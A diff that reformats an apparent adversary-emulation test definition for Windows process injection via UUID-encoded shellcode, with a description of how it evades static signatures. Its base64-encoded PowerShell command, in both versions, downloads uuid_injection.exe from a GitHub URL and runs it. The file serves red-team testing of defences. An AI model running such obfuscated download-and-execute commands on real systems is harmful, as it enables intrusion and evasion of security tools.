@@ -1,4 +1,4 @@
-- id: f4e9c21e-7932-5c4f-8835-41f318a51bd1
+- requirements: []
   name: Soumaia ART Tests - UUID custom process Injection
   description: 'The UUIDs Process Injection code was first introduced by the NCC Group. The code can be stored in UUID forms on the heap and converted back to binary via UuidFromStringA at runtime. In this new custom version of UUID injection, EnumSystemLocalesA is the only API called to execute the code. We used custom UuidToString and UuidFromString implementations to avoid using UuidFromStringA and RPCRT4.dll, thereby eliminating the static signatures. This technique also avoided the use of VirtualAlloc, WriteProcessMemory and CreateThread
 
@@ -10,21 +10,16 @@
 
     Concept from: http://ropgadget.com/posts/abusing_win_functions.html (requires elevation)'
   tactic: stealth
-  technique:
-    attack_id: T1055
-    name: Process Injection
-  platforms:
-    windows:
-      psh:
-        command: |-
-          powershell -NoProfile -EncodedCommand aQBmACAAKABUAGUAcwB0AC0AUABhAHQAaAAgACIALgBcAHUAdQBpAGQAXwBpAG4AagBlAGMAdABpAG8AbgAuAGUAeABlACIAKQAgAHsAZQB4AGkAdAAgADAAfQAgAGUAbABzAGUAIAB7AGUAeABpAHQAIAAxAH0ACgA=
-          if ($LASTEXITCODE -ne 0) {
-              powershell -NoProfile -EncodedCommand TgBlAHcALQBJAHQAZQBtACAALQBUAHkAcABlACAARABpAHIAZQBjAHQAbwByAHkAIAAoAHMAcABsAGkAdAAtAHAAYQB0AGgAIAAiAC4AXAB1AHUAaQBkAF8AaQBuAGoAZQBjAHQAaQBvAG4ALgBlAHgAZQAiACkAIAAtAEUAcgByAG8AcgBBAGMAdABpAG8AbgAgAGkAZwBuAG8AcgBlACAAfAAgAE8AdQB0AC0ATgB1AGwAbAAKAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgACIAaAB0AHQAcABzADoALwAvAGcAaQB0AGgAdQBiAC4AYwBvAG0ALwByAGUAZABjAGEAbgBhAHIAeQBjAG8ALwBhAHQAbwBtAGkAYwAtAHIAZQBkAC0AdABlAGEAbQAvAHIAYQB3AC8AbQBhAHMAdABlAHIALwBhAHQAbwBtAGkAYwBzAC8AVAAxADAANQA1AC8AYgBpAG4ALwB4ADYANAAvAHUAdQBpAGQAXwBpAG4AagBlAGMAdABpAG8AbgAuAGUAeABlACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAC4AXAB1AHUAaQBkAF8AaQBuAGoAZQBjAHQAaQBvAG4ALgBlAHgAZQAiAAoA
-          }
-          Start-Process ".\uuid_injection.exe"
-          Start-Sleep -Seconds 7
-          Get-Process -Name Notepad -ErrorAction SilentlyContinue | Stop-Process -Force
-        cleanup: |-
-          Get-Process -Name Notepad -ErrorAction SilentlyContinue | Stop-Process -Force
-        payloads:
-        - uuid_injection.exe
+  technique_id: T1055
+  technique_name: Process Injection
+  executors:
+  - cleanup:
+    - Get-Process -Name Notepad -ErrorAction SilentlyContinue | Stop-Process -Force
+    timeout: 60
+    platform: windows
+    name: psh
+    payloads:
+    - uuid_injection.exe
+    parsers: []
+    command: powershell -NoProfile -EncodedCommand aQBmACAAKABUAGUAcwB0AC0AUABhAHQAaAAgACIALgBcAHUAdQBpAGQAXwBpAG4AagBlAGMAdABpAG8AbgAuAGUAeABlACIAKQAgAHsAZQB4AGkAdAAgADAAfQAgAGUAbABzAGUAIAB7AGUAeABpAHQAIAAxAH0ACgA=; if ($LASTEXITCODE -ne 0) { powershell -NoProfile -EncodedCommand TgBlAHcALQBJAHQAZQBtACAALQBUAHkAcABlACAARABpAHIAZQBjAHQAbwByAHkAIAAoAHMAcABsAGkAdAAtAHAAYQB0AGgAIAAiAC4AXAB1AHUAaQBkAF8AaQBuAGoAZQBjAHQAaQBvAG4ALgBlAHgAZQAiACkAIAAtAEUAcgByAG8AcgBBAGMAdABpAG8AbgAgAGkAZwBuAG8AcgBlACAAfAAgAE8AdQB0AC0ATgB1AGwAbAAKAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgACIAaAB0AHQAcABzADoALwAvAGcAaQB0AGgAdQBiAC4AYwBvAG0ALwByAGUAZABjAGEAbgBhAHIAeQBjAG8ALwBhAHQAbwBtAGkAYwAtAHIAZQBkAC0AdABlAGEAbQAvAHIAYQB3AC8AbQBhAHMAdABlAHIALwBhAHQAbwBtAGkAYwBzAC8AVAAxADAANQA1AC8AYgBpAG4ALwB4ADYANAAvAHUAdQBpAGQAXwBpAG4AagBlAGMAdABpAG8AbgAuAGUAeABlACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAC4AXAB1AHUAaQBkAF8AaQBuAGoAZQBjAHQAaQBvAG4ALgBlAHgAZQAiAAoA }; Start-Process ".\uuid_injection.exe"; Start-Sleep -Seconds 7; Get-Process -Name Notepad -ErrorAction SilentlyContinue | Stop-Process -Force
+  id: f4e9c21e-7932-5c4f-8835-41f318a51bd1
